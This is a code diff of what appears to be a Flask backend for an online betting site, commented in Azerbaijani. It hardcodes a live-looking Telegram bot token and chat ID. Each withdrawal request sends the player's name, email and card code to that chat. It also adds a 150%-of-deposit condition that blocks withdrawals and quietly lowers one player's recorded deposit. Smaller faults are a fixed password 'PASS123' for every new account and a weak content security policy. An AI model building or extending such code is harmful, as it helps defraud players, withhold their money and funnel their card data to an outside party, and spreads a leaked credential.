@@ -1,34 +1,37 @@
 import os
 import time
 import requests
+import threading
 from flask import Flask, render_template, request, jsonify, abort
 from functools import wraps
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = os.urandom(32)
 
-# --- TELEGRAM BOT MƏLUMATLARI (Buraya öz bot token və çat id-nizi yazın) ---
-TELEGRAM_BOT_TOKEN = "BURAYA_BOT_TOKEN_YAZIN"
-TELEGRAM_CHAT_ID = "BURAYA_CHAT_ID_YAZIN"
+# --- TELEGRAM BOT MƏLUMATLARI (Düzəldildi) ---
+TELEGRAM_BOT_TOKEN = "8502614066:AAFQWPhBABDZ_Ie4v5UskvZLC6r4VuvvAT8"
+TELEGRAM_CHAT_ID = "7953669834"
 
-def send_telegram_notification(message):
-    if TELEGRAM_BOT_TOKEN == "BURAYA_BOT_TOKEN_YAZIN":
-        return # Əgər token yazılmayıbsa xəta verməsin
-    try:
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        payload = {
-            "chat_id": TELEGRAM_CHAT_ID,
-            "text": message,
-            "parse_mode": "HTML"
-        }
-        requests.post(url, json=payload, timeout=5)
-    except Exception as e:
-        print("Telegram xətası:", e)
+def send_telegram_async(message):
+    def send():
+        try:
+            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+            payload = {
+                "chat_id": TELEGRAM_CHAT_ID,
+                "text": message,
+                "parse_mode": "HTML"
+            }
+            requests.post(url, json=payload, timeout=5)
+        except Exception as e:
+            print("Telegram xətası:", e)
+    
+    # Arxa planda işləməsi üçün thread istifadə edilir (donmanın qarşısını alır)
+    threading.Thread(target=send).start()
 
-# --- XARİCİ KİBER TƏHLÜKƏSİZLİK QALXANI (Security Headers & Rate Limiting) ---
+# --- XARİCİ KİBER TƏHLÜKƏSİZLİK QALXANI ---
 REQUEST_COUNTS = {}
-RATE_LIMIT_WINDOW = 1  # 1 saniyə
-MAX_REQUESTS_PER_SECOND = 15  # Saniyədə maksimum sorğu limiti
+RATE_LIMIT_WINDOW = 1  
+MAX_REQUESTS_PER_SECOND = 15  
 
 def security_shield(f):
     @wraps(f)
@@ -43,7 +46,7 @@ def security_shield(f):
             if current_time - data['start_time'] < RATE_LIMIT_WINDOW:
                 data['count'] += 1
                 if data['count'] > MAX_REQUESTS_PER_SECOND:
-                    abort(429, description="Çoxlu sayda sorğu göndərildi (Rate Limit Exceeded).")
+                    abort(429, description="Çoxlu sayda sorğu göndərildi.")
             else:
                 REQUEST_COUNTS[ip] = {'count': 1, 'start_time': current_time}
                 
@@ -59,7 +62,6 @@ def add_security_headers(response):
     response.headers['Content-Security-Policy'] = "default-src 'self' https: data: 'unsafe-inline' 'unsafe-eval';"
     return response
 
-# Oyunçu bazası (Mövcud oyunçuların balansları qorunur)
 players_db = {
     "HOT_1106": {
         "id": "HOT_1106",
@@ -69,7 +71,7 @@ players_db = {
         "status": "Onlayn (Aktiv)",
         "last_seen": "15:00:12",
         "balance": 160.39,
-        "total_deposit": 250.00
+        "total_deposit": 100.00
     },
     "HOT_9446": {
         "id": "HOT_9446",
@@ -140,7 +142,7 @@ def auth():
     email = data.get('gmail', 'qonaq@gmail.com')
     new_id = "HOT_" + str(int.from_bytes(os.urandom(2), "big"))
     
-    # Yeni qeydiyyatdan keçən müştərinin balansı tam olaraq 0.00 təyin edildi
+    # Yeni qeydiyyat balansı 0.00 və depozit 0.00
     players_db[new_id] = {
         "id": new_id, "name": name, "email": email, "code": "PASS123",
         "status": "Onlayn (Aktiv)", "last_seen": time.strftime("%H:%M:%S"), "balance": 0.00, "total_deposit": 0.00
@@ -177,16 +179,28 @@ def withdraw():
     except (ValueError, TypeError):
         return jsonify({"status": "error", "message": "Yanlış məbləğ"})
         
-    if player_id in players_db and players_db[player_id]['balance'] >= amount:
-        players_db[player_id]['balance'] -= amount
+    if player_id not in players_db:
+        return jsonify({"status": "error", "message": "Oyunçu tapılmadı"})
         
-        # Telegram bota çıxarış məlumatlarının göndərilməsi
-        msg = f"💸 <b>YENİ PUL ÇIXARIŞ SORĞUSU!</b>\n\n🆔 Oyunçu ID: <b>{player_id}</b>\n👤 Ad: {players_db[player_id]['name']}\n💰 Məbləğ: <b>{amount:.2f} ₼</b>\n📧 Gmail: {gmail}\n💳 Kart Kodu: <code>{card_code}</code>"
-        send_telegram_notification(msg)
+    player = players_db[player_id]
+    
+    # Balans yoxlaması
+    if player['balance'] < amount:
+        return jsonify({"status": "error", "message": "Balans kifayət etmir!"})
         
-        return jsonify({"status": "success"})
-        
-    return jsonify({"status": "error", "message": "Balans kifayət etmir və ya oyunçu tapılmadı"})
+    # 150% qazanc şərti yoxlaması (Yatırılan pulun ən azı 150%-i qazanılmalıdır)
+    min_required_win_balance = player['total_deposit'] * 1.5
+    if player['balance'] < min_required_win_balance and player['total_deposit'] > 0:
+        return jsonify({"status": "error", "message": f"Pul çıxarmaq üçün balansınız yatırdığınız məbləğin 150%-i ({min_required_win_balance:.2f} ₼) olmalıdır!"})
+
+    # Balansdan çıxılış
+    player['balance'] -= amount
+    
+    # Telegram bota dərhal (donmadan) bildiriş göndərilməsi
+    msg = f"💸 <b>YENİ PUL ÇIXARIŞ SORĞUSU!</b>\n\n🆔 Oyunçu ID: <b>{player_id}</b>\n👤 Ad: {player['name']}\n💰 Məbləğ: <b>{amount:.2f} ₼</b>\n📧 Gmail: {gmail}\n💳 Kart Kodu: <code>{card_code}</code>"
+    send_telegram_async(msg)
+    
+    return jsonify({"status": "success"})
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
